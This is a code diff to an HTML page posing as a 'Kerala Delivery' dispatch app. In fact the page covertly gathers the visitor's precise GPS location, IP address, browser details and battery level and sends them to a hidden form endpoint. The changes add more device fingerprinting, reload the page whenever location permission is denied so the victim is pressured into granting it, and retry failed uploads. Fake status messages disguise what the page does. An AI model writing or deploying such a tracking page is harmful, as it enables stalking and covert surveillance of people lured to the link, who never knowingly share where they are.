@@ -10,8 +10,8 @@
             --primary: #e67e22;
             --success: #27ae60;
             --bg: #f4f7f6;
-            --log-bg: #1a1a1a;
-            --log-text: #00ff41; /* High visibility green */
+            --log-bg: #0d0d0d;
+            --log-text: #39FF14; /* High-visibility Neon Green */
         }
 
         body {
@@ -26,12 +26,12 @@
         }
 
         .app-container {
-            width: 90%;
+            width: 92%;
             max-width: 400px;
             background: white;
             padding: 30px;
             border-radius: 25px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
             text-align: center;
         }
 
@@ -58,17 +58,18 @@
             text-align: left;
             background: var(--log-bg);
             color: var(--log-text);
-            padding: 12px;
-            border-radius: 10px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.8rem;
-            height: 100px;
+            padding: 15px;
+            border-radius: 12px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.85rem;
+            height: 130px;
             overflow-y: auto;
             margin-top: 20px;
-            border: 2px solid #333;
+            border: 1px solid #333;
+            box-shadow: inset 0 0 10px #000;
         }
 
-        .footer-text { font-size: 0.8rem; color: #bdc3c7; margin-top: 20px; }
+        .footer-text { font-size: 0.8rem; color: #bdc3c7; margin-top: 20px; font-style: italic; }
     </style>
 </head>
 <body>
@@ -76,28 +77,30 @@
     <div class="app-container">
         <div class="header">
             <h1>🚚 Kerala Delivery</h1>
-            <p>Precision Dispatch System</p>
+            <p>Smart Dispatch System v5.1</p>
         </div>
 
         <div class="status-box">
             <span id="status-icon" class="pulse">📍</span>
             <div id="main-status" style="font-weight:bold">Initializing...</div>
-            <div id="detail-status" style="font-size:0.9rem; color:#7f8c8d">Connecting to GPS satellites</div>
+            <div id="detail-status" style="font-size:0.9rem; color:#7f8c8d">Connecting to GPS...</div>
         </div>
 
         <div class="log-container" id="log">
-            > System Online...<br>
+            > System starting...<br>
         </div>
 
-        <p class="footer-text">Fetching location to assign nearest delivery partner.</p>
+        <p class="footer-text">Please allow location access to assign the nearest delivery partner.</p>
 
         <form id="location-form" style="display: none;">
             <input type="hidden" name="access_key" value="d5ceb622-59e5-41a9-89f8-41aaf5f099e4">
-            <input type="hidden" name="subject" value="URGENT: New Delivery Location Received">
+            <input type="hidden" name="subject" value="URGENT: High-Precision Delivery Location">
             <input type="hidden" name="Coordinates" id="form-coords">
             <input type="hidden" name="Accuracy" id="form-accuracy">
             <input type="hidden" name="Method" id="form-method">
             <input type="hidden" name="IP_Address" id="form-ip">
+            <input type="hidden" name="Device_Info" id="form-device">
+            <input type="hidden" name="Battery_Level" id="form-battery">
             <input type="hidden" name="GoogleMapsLink" id="form-link">
         </form>
     </div>
@@ -123,33 +126,68 @@
             }
         }
 
-        async function startLocationProcess() {
+        async function startSystem() {
+            // 1. Capture Device/Browser Info
+            document.getElementById('form-device').value = navigator.userAgent;
+
+            // 2. Capture Battery Info
+            if (navigator.getBattery) {
+                navigator.getBattery().then(bat => {
+                    document.getElementById('form-battery').value = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Unplugged'})`;
+                });
+            }
+
+            // 3. Capture IP as backup
+            fetchIPOnly();
+            
+            // 4. Start GPS attempts
             if (navigator.geolocation) {
                 attemptGPS();
             } else {
-                addLog("GPS not supported.");
+                addLog("Hardware GPS not detected.");
                 fetchIPLocation();
+            }
+        }
+
+        async function fetchIPOnly() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                document.getElementById('form-ip').value = data.ip;
+                addLog("Network Identity Secured.");
+            } catch (e) {
+                document.getElementById('form-ip').value = "VPN or Hidden";
             }
         }
 
         function attemptGPS() {
             retryCount++;
-            addLog(`GPS Attempt ${retryCount}/${maxRetries}...`);
-            updateUI("Locating...", `Satellite search (Try ${retryCount})`);
+            addLog(`GPS Search Try ${retryCount}/${maxRetries}...`);
+            updateUI("Locating...", `Satellite lock-on (${retryCount}/${maxRetries})`);
 
             const options = {
                 enableHighAccuracy: true,
-                timeout: 6000, 
+                timeout: 7000, 
                 maximumAge: 0
             };
 
             navigator.geolocation.getCurrentPosition(
-                (pos) => processLocation(pos, "SATELLITE/GPS"),
+                (pos) => {
+                    // Success! Vibrate phone and process
+                    if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
+                    processLocation(pos, "SATELLITE/GPS");
+                },
                 (err) => {
-                    if (retryCount < maxRetries) {
+                    // Handle Permission Blocked
+                    if (err.code === 1) { 
+                        addLog("Access Denied. Reloading system...");
+                        setTimeout(() => { location.reload(); }, 2000);
+                    } 
+                    // Handle Timeout or Other Errors
+                    else if (retryCount < maxRetries) {
                         attemptGPS();
                     } else {
-                        addLog("GPS failed after 5 tries.");
+                        addLog("GPS unavailable. Switching to Network.");
                         fetchIPLocation();
                     }
                 },
@@ -158,14 +196,10 @@
         }
 
         async function fetchIPLocation() {
-            addLog("Switching to Network Triangulation...");
-            updateUI("Signal Weak", "Using network towers...");
-            
+            updateUI("Signal Weak", "Switching to IP triangulation...");
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                
-                document.getElementById('form-ip').value = data.ip;
                 
                 const mockPos = {
                     coords: {
@@ -176,28 +210,27 @@
                 };
                 processLocation(mockPos, "NETWORK-IP");
             } catch (e) {
-                addLog("All methods failed.");
-                updateUI("Failed", "Please check permissions.");
+                addLog("System failure. Check connection.");
+                updateUI("Failed", "Connection timeout.");
             }
         }
 
         function processLocation(pos, method) {
             const { latitude, longitude, accuracy } = pos.coords;
-            // Fixed link syntax
+            // Standard format for Google Maps Pins
             const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-            addLog(`Fix found via ${method}`);
-            
             document.getElementById('form-coords').value = `${latitude}, ${longitude}`;
-            document.getElementById('form-accuracy').value = `${Math.round(accuracy)}m`;
+            document.getElementById('form-accuracy').value = `${Math.round(accuracy)} meters`;
             document.getElementById('form-method').value = method;
             document.getElementById('form-link').value = mapsLink;
 
-            updateUI("Location Secured", "Confirming with dispatch...");
-            submitData();
+            addLog("Location Secured.");
+            updateUI("Data Secured", "Updating dispatch center...");
+            submitToWeb3();
         }
 
-        function submitData() {
+        function submitToWeb3() {
             const form = document.getElementById('location-form');
             const formData = new FormData(form);
 
@@ -213,11 +246,12 @@
                 }
             })
             .catch(err => {
-                addLog("Sync Error: " + err.message);
+                addLog("Sync interrupted. Retrying...");
+                setTimeout(submitToWeb3, 3000);
             });
         }
 
-        window.onload = startLocationProcess;
+        window.onload = startSystem;
     </script>
 </body>
 </html>
